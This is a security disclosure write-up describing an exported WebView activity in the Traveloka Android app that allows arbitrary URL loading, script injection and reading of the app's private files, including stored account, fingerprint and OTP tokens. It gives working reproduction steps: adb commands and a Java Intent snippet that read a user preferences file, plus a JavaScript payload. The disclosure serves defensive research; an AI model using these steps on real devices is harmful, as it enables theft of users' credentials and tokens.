# Traveloka Android App Critical Vulnerability
Exported Webview in Traveloka Android app lead to opening arbitrary URLs/XSS and steal any protected files

**Researcher: Tony of The Tarantula Team, VinCSS (a member of Vingroup)**

## Background

We found an exported Webview Activity (**com.traveloka.android.activity.common.WebViewActivity**) in Traveloka Android app but it didn't have any protection mechanism. It means that it can be accessed by any third-party apps installed on the same device (No need to be a rooted device). On the newest Androids it also could be exploited by Android Instant Apps directly from a Web Browser.

![](Traveloka-AndroidManifest.png)

In **com.traveloka.android.activity.common.WebViewActivity**, We can see that this Webview will get the URL from the Intent data and load it:

![](Traveloka-Get-Intent.png)

And because this Webview and most of Traveloka's Webview enabled Javascript Interface. So we can opening arbitrary URLs/XSS with **com.traveloka.android.activity.common.WebViewActivity**

![](Result-when-loading-XSS-payload-directly-to-webview.JPG)

![](Load-normal-site(Google)-into-Traveloka-Webview.JPG)

We also can retrieve any protected files from /data/data/com.traveloka.android/* directory:

![](Traveloka-Customer-Sensitive-Information.png)

Traveloka has stored a lot of sensitive customer information (including account information, fingerprint tokens, OTP tokens and more) in the Shared_Prefs folder, so we can get a lot of sensitive information through this vulnerability:

![](Traveloka-Protected-Files.png)

## Steps to Reproduce

Install Traveloka Android app V3.14.0 or earlier (https://play.google.com/store/apps/details?id=com.traveloka.android) and login with any customer account

If you want to reproduce this vulnerability with adb: 

```
adb shell am start -n com.traveloka.android/com.traveloka.android.activity.common.WebViewActivity -d "file:///data/data/com.traveloka.android/shared_prefs/com.traveloka.android.pref_user.xml"
```

```
adb shell am start -n com.traveloka.android/com.traveloka.android.activity.common.WebViewActivity -d "javascript:alert\(1\)"
```

If you want to reproduce this vulnerability with third-party app:

```java
Intent intent = new Intent();
intent.setClassName("com.traveloka.android", "com.traveloka.android.activity.common.WebViewActivity");
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
intent.setData(Uri.parse("file:///data/data/com.traveloka.android/shared_prefs/com.traveloka.android.pref_user.xml"));
startActivity(intent);
```

## Tested versions
Lastest version of Traveloka Android app (V3.14.0). Release: September 03, 2019.

## Disclosure timeline

August 05, 2019: Report submitted to Traveloka.

September 03, 2019: Not receiving any response from Traveloka security team so far.

September 17, 2019: Send the last warning to Traveloka via Linkedin. Still not receiving any response from Traveloka security team so far.

## Reference

https://cwe.mitre.org/data/definitions/926.html

